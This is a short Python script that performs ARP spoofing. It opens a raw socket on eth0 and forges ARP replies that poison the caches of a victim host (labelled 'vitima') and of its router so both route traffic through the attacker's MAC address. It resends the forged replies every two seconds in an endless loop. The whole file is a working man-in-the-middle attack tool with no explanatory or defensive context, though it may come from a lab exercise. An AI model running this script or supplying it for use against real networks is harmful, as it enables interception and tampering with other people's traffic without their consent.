import socket
import struct
import subprocess
import binascii
from time import sleep

def get_mac(ip):
    """Get the MAC address of a given IP."""
    output = subprocess.check_output(["arp", "-n"], encoding="utf-8")
    for line in output.splitlines():
        if ip in line:
            return line.split()[2]
    return None

raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
raw.bind(("eth0",socket.htons(0x0806)))

src_mac = '08:00:27:ad:25:87'
ip_router = "192.168.240.26"
router_mac = get_mac(ip_router)
ip_vitima = "192.168.240.124"
vit_mac = get_mac(ip_vitima)

type_hardware = 1
type_protocol = 0x0800                               
len_hardware = 6            
len_protocol = 4            
operacao_reply = 2

protocolo = 0x0806                                                 

vit_ip = socket.inet_aton(ip_vitima)
router_ip = socket.inet_aton(ip_router)

vit_mac_byte_order = binascii.unhexlify(vit_mac.replace(":", ""))
src_mac_byte_order = binascii.unhexlify(src_mac.replace(":", ""))
router_mac_byte_order = binascii.unhexlify(router_mac.replace(":", ""))

ethernet_frame_vit = struct.pack("!6s6sH", vit_mac_byte_order, src_mac_byte_order, protocolo)
ethernet_frame_router = struct.pack("!6s6sH", router_mac_byte_order, src_mac_byte_order, protocolo)

arp_header_vit = struct.pack("!HHBBH6s4s6s4s",type_hardware, 
                        type_protocol, 
                        len_hardware, 
                        len_protocol, 
                        operacao_reply, 
                        src_mac_byte_order, 
                        router_ip, 
                        vit_mac_byte_order, 
                        vit_ip)

arp_header_router = struct.pack("!HHBBH6s4s6s4s",type_hardware, 
                        type_protocol, 
                        len_hardware, 
                        len_protocol, 
                        operacao_reply, 
                        src_mac_byte_order, 
                        vit_ip, 
                        router_mac_byte_order, 
                        router_ip)


pacote_vitima = ethernet_frame_vit + arp_header_vit
pacote_router = ethernet_frame_router + arp_header_router

while True:
    raw.send(pacote_vitima)
    raw.send(pacote_router)
    sleep(2)